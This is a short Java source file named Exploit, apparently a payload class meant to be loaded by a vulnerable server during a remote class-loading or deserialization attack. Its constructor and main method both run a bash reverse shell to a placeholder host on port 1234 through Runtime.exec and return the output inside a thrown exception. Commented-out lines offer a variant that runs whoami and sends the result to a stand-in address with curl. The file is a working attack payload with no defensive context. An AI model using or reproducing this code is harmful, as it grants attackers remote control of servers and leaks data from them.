import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
public class Exploit {
    public static String exec(String cmd) throws Exception {
        String sb = "";
        BufferedInputStream in = new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());
        BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
        String lineStr;
        while ((lineStr = inBr.readLine()) != null)
            sb += lineStr + "\n";
        inBr.close();
        in.close();
        return sb;
    }
    public Exploit() throws Exception {
        String result = "";
        //result = exec("whoami");
        //String cmd="curl http://x.x.x.x/"+result;
        String cmd="bash -i >& /dev/tcp/xx/1234 0>&1";
        throw new Exception(exec(cmd));
    }
    public static void main(String[] args) throws Exception {
        String result = "";
        //result = exec("whoami");
        //String cmd="curl http://x.x.x.x/"+result;
        String cmd="bash -i >& /dev/tcp/xx/1234 0>&1";
        throw new Exception(exec(cmd));
    }
}
